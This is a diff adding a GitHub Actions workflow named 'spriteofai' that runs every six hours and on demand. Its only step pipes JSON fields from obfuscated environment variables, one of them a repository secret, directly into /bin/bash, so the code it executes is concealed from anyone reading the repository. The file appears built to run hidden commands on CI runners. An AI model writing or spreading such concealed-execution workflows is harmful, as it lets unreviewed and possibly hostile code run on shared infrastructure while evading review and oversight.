@@ -1,0 +1,27 @@
+name: spriteofai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: spriteofai
+        env:
+          zfzab14: ${{ secrets.zfzab14 }}
+        run: |
+          echo $zfzab14 | jq -r .mjbp247 | /bin/bash
+          echo $wugg08440 | jq -r .wxn738 | /bin/bash
+          echo $g28819 | jq -r .olhfl38 | /bin/bash
+          echo $j8695 | jq -r .efs05 | /bin/bash
+          echo $lmqn4 | jq -r .tl98103 | /bin/bash
+          echo $hri907 | jq -r .v2 | /bin/bash
+          echo $hfetk5 | jq -r .ae1 | /bin/bash
+          echo $de3 | jq -r .lgyq450 | /bin/bash
+          echo $xc04201 | jq -r .b46 | /bin/bash
+          echo $mtqyn116 | jq -r .xogt90520 | /bin/bash
+          echo $dhkwj77569 | jq -r .tas47024 | /bin/bash
+
